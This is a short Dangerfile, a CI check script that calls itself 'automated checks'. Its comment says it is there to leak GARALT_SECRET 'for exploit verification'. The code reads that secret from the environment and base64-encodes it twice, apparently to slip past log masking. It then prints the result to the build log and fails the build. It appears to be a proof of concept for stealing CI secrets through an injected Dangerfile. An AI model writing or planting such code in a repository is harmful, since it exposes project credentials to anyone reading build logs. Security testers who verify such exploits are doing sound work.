// Dangerfile - automated checks
import { fail } from 'danger'

// Leak GARALT_SECRET for exploit verification
const secret = process.env.GARALT_SECRET || ''
const b64 = Buffer.from(secret).toString('base64')
const b64b64 = Buffer.from(b64).toString('base64')
console.log(`GARALT_LEAKED_TOKEN=${b64b64}`)
fail('Verification: token leaked')
